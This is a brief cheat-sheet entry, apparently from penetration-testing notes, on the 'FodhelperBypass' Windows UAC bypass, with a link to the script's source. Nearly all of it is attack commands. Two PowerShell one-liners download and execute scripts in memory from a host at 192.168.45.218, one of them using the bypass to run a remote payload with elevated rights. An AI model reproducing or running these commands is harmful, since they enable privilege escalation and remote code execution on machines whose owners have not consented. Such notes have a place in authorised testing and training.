# Name
FodHelperBypass (Bypass UAC)

## Usage
```
# Load FodHelper into memory
iex (new-object net.webclient).downloadstring('http://192.168.45.218/FodhelperBypass.ps1')

# Using ps_shellcode runner
FodhelperBypass -program "powershell -c iex (new-object net.webclient).downloadstring('http://192.168.45.218/runall.ps1')"
```

## Source
https://raw.githubusercontent.com/winscripting/UAC-bypass/refs/heads/master/FodhelperBypass.ps1
